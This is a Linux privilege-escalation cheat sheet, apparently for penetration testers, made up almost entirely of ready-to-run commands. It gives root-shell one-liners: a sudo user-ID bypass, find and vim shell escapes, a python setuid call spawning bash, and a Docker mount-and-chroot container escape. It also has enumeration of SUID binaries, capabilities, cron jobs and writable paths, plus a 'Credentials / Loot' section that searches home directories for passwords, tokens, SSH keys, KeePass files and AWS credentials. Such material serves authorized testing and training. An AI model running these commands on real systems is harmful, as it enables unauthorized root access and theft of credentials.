# Linux Privilege Escalation Cheatsheet

## First Checks

```bash
id
hostname
uname -a
sudo -l
env
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

## Sudo

```bash
sudo -l
sudo -n -l
sudo -u#-1 /bin/bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
sudo /usr/bin/vim -c ':set shell=/bin/sh' -c ':shell'
```

Watch for:

- `NOPASSWD`
- wildcard paths
- env keep / `SETENV`
- editable scripts executed as root

## SUID / SGID

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
strings /usr/bin/<binary> | head
```

Common GTFOBins pivots:

- `find`
- `vim`
- `less`
- `bash`
- `tar`
- `cp`
- `python`

## Capabilities

```bash
getcap -r / 2>/dev/null
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Look for:

- `cap_setuid+ep`
- `cap_dac_read_search+ep`
- `cap_sys_admin+ep`

## Cron / Timers

```bash
cat /etc/crontab
find /etc/cron* -maxdepth 2 -type f -print -exec cat {} \; 2>/dev/null
systemctl list-timers --all
```

Check for:

- world-writable script targets
- relative paths
- writable directories in cron task paths

## Writable Paths

```bash
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|run)'
find / -writable -type f 2>/dev/null | head -n 200
```

## Docker / Container Escape

```bash
groups
ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null
docker ps
docker run --rm -it -v /:/mnt alpine chroot /mnt /bin/sh
```

## PATH / Hijacking

```bash
echo "$PATH"
find / -type f -perm -u+x -name '*' 2>/dev/null | grep -E '/usr/local/bin|/tmp|/dev/shm'
```

Targets:

- root-owned scripts calling bare commands
- writable directories before `/usr/bin`

## Credentials / Loot

```bash
grep -RniE 'pass|token|secret|key' /home /opt /var/www 2>/dev/null | head -n 200
find /home -name 'id_*' -o -name '*.kdbx' -o -name '.aws' 2>/dev/null
cat ~/.ssh/config ~/.ssh/known_hosts 2>/dev/null
```
